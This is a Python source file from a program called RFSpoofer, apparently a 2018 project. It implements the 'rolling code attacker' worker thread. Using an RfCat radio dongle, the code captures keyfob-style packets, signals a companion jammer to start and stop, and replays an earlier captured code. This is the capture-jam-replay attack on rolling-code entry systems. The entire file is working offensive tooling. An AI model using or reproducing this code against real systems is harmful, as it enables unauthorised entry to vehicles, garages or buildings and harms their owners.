"""---------------------------------------------------------------------------------------
--      SOURCE FILE:        rollingworker.py - rolling code attacker worker
--
--      PROGRAM:            RFSpoofer
--
--
--      DATE:               May 14, 2018
--
--      DESIGNERS:          Thomas Yu
--
--      PROGRAMMERS:        Thomas Yu
--
--      NOTES:
--      This file is responsible for listening, sending, and signaling the
--      jam worker. This class is started as a thread from rfspoofer.py
---------------------------------------------------------------------------------------"""
    # worker.py
from PyQt5.QtCore import QThread, QObject, pyqtSignal, pyqtSlot
from PyQt5 import QtCore
import time
import bitstring
import os
from rflib import *


class RollingWorker(QObject, RfCat):
    def __init__(self, Rfcat):
        super(RollingWorker, self).__init__()
        self.dongle = Rfcat
    finished = pyqtSignal()
    messageReady = pyqtSignal(str)
    saveReady= pyqtSignal(str)
    jamStart = pyqtSignal(str)
    jamStop = pyqtSignal(str)
    @pyqtSlot()
    def procListen(self): # A slot takes no params

        self.Listening = True
        capturedPackets = []
        pktcounter = 1
        while self.Listening:
            try:
                rawdata, t = self.dongle.RFrecv(1)
                hexdata = rawdata.encode('hex')
                strength= 0 - ord(str(self.dongle.getRSSI()))

                if strength > -100 and strength <-10:
                    print("packet received")
                    msg = "Packet: " + str(pktcounter) + ", with Signal Strength:" + str(strength) + ", with signal: " + str(hexdata) + " , ASCII: " +  makeFriendlyAscii(rawdata) +'\n'
                    capturedPackets.append(hexdata)
                    self.messageReady.emit(msg)
                    saveMsg = str(pktcounter) + ', ' + str(hexdata) + os.linesep
                    self.saveReady.emit(saveMsg)
                    pktcounter+=1
                    if pktcounter > 2:
                        time.sleep(0.5)
                        self.jamStop.emit("")
                        self.messageReady.emit("sending packet")
                        bytePacket = bitstring.BitArray(hex=capturedPackets[pktcounter -3]).tobytes()
                        self.dongle.makePktFLEN(len(bytePacket))
                        self.dongle.RFxmit(bytePacket)
                        self.jamStart.emit("")

            except (KeyboardInterrupt):
                break
            except (ChipconUsbTimeoutException):
                pass
        print("finished")
        self.dongle.setModeIDLE()


    @pyqtSlot(str)
    def stopListen(self, foo):
        print("stopped called")
        self.Listening = False
